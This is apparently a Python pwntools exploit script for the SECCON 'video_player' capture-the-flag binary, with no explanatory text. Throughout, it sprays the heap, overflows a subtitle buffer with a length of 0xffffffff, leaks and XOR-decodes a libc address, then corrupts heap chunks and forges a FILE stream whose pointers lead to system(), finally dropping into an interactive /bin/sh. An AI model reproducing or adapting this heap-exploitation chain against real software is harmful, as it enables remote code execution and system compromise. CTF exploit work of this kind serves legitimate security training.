from pwn import *

r = process("./video")
#r = remote("video_player.pwn.seccon.jp", 7777)

def addVideo(size, data, description):
    r.sendline("1")
    r.recvuntil(">> ")
    r.sendline("1")
    r.recvuntil("Resolution : ")
    r.send("AAAAAAAA")
    r.recvuntil("FPS : ")
    r.send("AAAA")
    r.recvuntil("Frames : ")
    r.send(p32(size))
    r.recvuntil("Data : ")
    r.send(data)
    r.recvuntil("description : ")
    r.send(description)
    r.recvuntil(">>> ")

def addSubtitle(lang, length, subtitle, first):
    r.sendline("1")
    print r.recvuntil(">>> ")
    r.sendline("3")
    
    if(first):
        print r.recvuntil("Language : ")
        r.send(lang)

    print r.recvuntil("Length : ")
    r.send(p32(length))
    print r.recvuntil("Subtitle : ")
    r.sendline(subtitle)

    print r.recvuntil(">>> ")

def delClip(idx):
    r.sendline("4")
    print r.recvuntil("index : ")
    r.sendline(str(idx))
    print r.recvuntil(">>> ")

print r.recvuntil("name?")
r.sendline("mathboy7")

print r.recvuntil(">>> ")

for i in range(0, 120):
    addVideo(1024, "/bin/sh;" + "A"*1016, "A"*0x2f)
    if i % 10 == 0:
        print str(i)

addSubtitle("kk", 100, "P"*100, 1)

addVideo(100, "a"*100, "A"*0x2f)
delClip(121)
addVideo(200, "b"*200, "B"*0x2f)

payload = "A"*4
payload += p64(0x61)
payload += p64(0x402968)
payload += "A"*12
payload += p32(0xc8)
payload += p64(0x604050)

addSubtitle("kk", 0xffffffff, payload, 0)

r.sendline("3")
print r.recvuntil("index : ")
r.sendline("122")

print r.recvuntil("video...\n")

rv = r.recv(6)
c = ""
for i in rv:
    c += chr(ord(i) ^ 0xcc)

libc = u64(c + "\x00\x00")
print r.recvuntil(">>> ")
print "libc: " + hex(libc)

delClip(120)

addVideo(100, "a"*100, "A"*0x2f)
addVideo(100, "a"*100, "A"*0x2f)

addSubtitle("kk", 113, "b"*113, 1)

addVideo(113, "a"*113, "A"*0x2f) # 126
delClip(126)
addVideo(104, "b"*104, "B"*0x2f) # 127
delClip(127)

libc_base = libc - 0xf7220
system = libc + 0x45390

payload = "B"*103
payload += p64(0x71)
payload += p64(libc_base + 0x3c46bd)

addSubtitle("kk", 0xffffffff, payload, 0)

payload = "\x00"*3
payload += "\x00"*16
payload += p64(0xffffffff)
payload += "\x00"*16
#payload += p64(0x414141414141) # libc + 0x3c56d0
payload += p64(libc_base + 0x3c46e8)
payload += p64(libc_base + 0x3c4540)
payload += p64(libc_base + 0x3c4620)
payload += p64(libc_base + 0x3c38e0)
payload += p64(libc_base + 0x20b70)
payload += p64(libc_base + 0x6ed80)
#payload += p64(0x424242424242)
payload += "A"*5

addVideo(104, "b"*104, "B"*0x2f)

r.sendline("1")
r.recvuntil(">> ")
r.sendline("1")
r.recvuntil("Resolution : ")
r.send("AAAAAAAA")
r.recvuntil("FPS : ")
r.send("AAAA")
r.recvuntil("Frames : ")
r.send(p32(104))
r.recvuntil("Data : ")
r.send(payload)

file_stream = "\x87\x20\xad\xfb\x3b\x73\x68\x00"
file_stream += p64(libc_base + 0x3c46a3)*7
file_stream += p64(libc_base + 0x3c46a4)
file_stream += "\x00"*32
file_stream += p64(libc_base + 0x3c38e0)
file_stream += p64(0x1)
file_stream += p64(0xffffffffffffffff)
file_stream += p64(0x0000000)
file_stream += p64(libc_base + 0x3c5780)
file_stream += p64(0xffffffffffffffff)
file_stream += "\x00"*8
file_stream += p64(libc_base + 0x3c37a0)
file_stream += "\x00"*24
file_stream += p64(0xffffffff)
file_stream += "\x00"*16
file_stream += p64(libc_base + 0x3c46e8)
file_stream += p64(libc_base + 0x3c4540)
file_stream += p64(libc_base + 0x3c4620)
file_stream += p64(libc_base + 0x3c38e0)
file_stream += p64(libc_base + 0x20b70)
file_stream += p64(system) * 20

r.sendline(file_stream)

r.interactive()
